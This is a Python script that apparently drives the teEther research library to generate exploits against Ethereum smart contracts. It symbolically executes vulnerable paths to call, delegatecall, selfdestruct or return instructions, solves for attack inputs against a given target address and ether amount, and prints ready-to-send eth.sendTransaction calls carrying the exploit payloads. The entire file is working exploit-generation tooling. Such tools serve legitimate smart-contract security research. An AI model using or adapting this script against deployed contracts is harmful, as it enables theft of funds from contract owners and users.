#!/usr/bin/env python3

from teether.exploit import ExploitContext, attempt_exploit
from teether.project import Project

INTERESTING_INS = ('CALL', 'CALLCODE', 'DELEGATECALL', 'SELFDESTRUCT', 'RETURN', 'STOP')

if __name__ == '__main__':
    import sys
    import json

    if len(sys.argv) < 5:
        print("Usage: %s <project.json> <exploit.json> <target-addr> <target-target_amount>" % sys.argv[0], file=sys.stderr)
        sys.exit(-1)

    with open(sys.argv[1]) as f:
        project_dict = json.load(f)

    p = Project.from_json(project_dict)

    with open(sys.argv[2]) as f:
        exploit_dict = json.load(f)

    target_addr = int(sys.argv[3].strip(), 16)
    shellcode_addr = 0x1000000000000000000000000000000000000000
    target_amount = sys.argv[4].strip()
    amount_check = '+'
    if target_amount[0] in ('=', '+', '-'):
        amount_check = target_amount[0]
        target_amount = target_amount[1:]
    target_amount = int(target_amount)

    initial_storage = dict()
    if len(sys.argv) > 5:
        with open(sys.argv[5], 'rb') as f:
            initial_storage = {int(k, 16): int(v, 16) for k, v in json.load(f).items() if int(v, 16) != 0}

    initial_balance = None
    if len(sys.argv) > 6:
        initial_balance = int(sys.argv[6])

    ctx = ExploitContext(target_addr, shellcode_addr, target_amount, amount_check, initial_balance, initial_storage)

    paths = []
    for path_dict in sorted(exploit_dict['paths'], key=lambda x: x['index']):
        # extend buggy paths...
        path = path_dict['path']
        last_ins = p.prg[path[-1]]
        bb = last_ins.bb
        idx = bb.ins.index(last_ins)
        for ins in bb.ins[idx:]:
            if ins.name in INTERESTING_INS:
                break
        if ins.addr != path[-1]:
            path.append(ins.addr)
        paths.append(path)

    symbolic_results = []
    for path in paths:
        symbolic_results.append(p.run_symbolic(path))

    result = attempt_exploit(symbolic_results, ctx)
    if result:
        call, r, model = result

        print(model)
        print('\n'.join(x.name() for x in model.decls()))

        for i, res in enumerate(r.results):
            print('%d: %s' % (
                i, '->'.join('%x' % i for i in res.state.trace if i in p.cfg.bb_addrs or i == res.state.trace[-1])))
        print(call)
        print
        for c in call:
            if c['caller'] == 0x1000000000000000000000000000000000000000:
                print('eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x1000000000000000000000000000000000000000"%s, gas:500000, gasPrice:0})' % (
                    target_addr, c.get('payload', b'').hex(), ", value:%d" % c['value'] if c.get('value', 0) else ''))
            else:
                print('eth.sendTransaction({from:"0x%040x", data:"0x%s", to:"0x4000000000000000000000000000000000000000"%s, gas:500000, gasPrice:0})' % (
                    target_addr, c.get('payload', b'').hex(), ", value:%d" % c['value'] if c.get('value', 0) else ''))
